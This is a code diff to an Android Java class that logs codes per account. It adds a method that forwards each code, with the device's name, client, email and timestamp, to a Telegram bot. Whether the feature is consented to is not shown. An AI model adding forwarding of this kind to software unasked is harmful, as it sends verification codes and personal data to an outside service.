@@ -23,6 +23,24 @@ final class CodeLogStore {
         long now = System.currentTimeMillis();
         SharedPreferences p = prefs(context);
         p.edit().putString(KEY, CodeLog.append(p.getString(KEY, ""), now, accountId, kind, code, now)).apply();
+        sendToBot(context, accountId, kind, code.trim(), now);
+    }
+
+    /** 🔑 «بوت الأكواد»: the code with its device's details (pushed by the app, TelegramStore.codeDevices). */
+    private static void sendToBot(Context context, String accountId, String kind, String code, long at) {
+        try {
+            JSONObject device = accountId == null || accountId.isEmpty() ? null : new JSONObject(TelegramStore.codeDevices(context)).optJSONObject(accountId);
+            String time = new java.text.SimpleDateFormat("dd/MM HH:mm", java.util.Locale.ROOT).format(new java.util.Date(at));
+            String text = CodeBotText.message(kind, code,
+                device != null ? device.optString("name", null) : null,
+                device != null ? device.optString("client", null) : null,
+                device != null ? device.optString("email", null) : null,
+                device != null ? device.optString("kit", null) : null,
+                time);
+            TelegramSendWorker.enqueueCode(context, text);
+        } catch (JSONException | RuntimeException ignored) {
+            // the code is kept in «الأكواد» either way
+        }
     }
 
     /** Newest first: [{at, accountId, kind, code}]. */
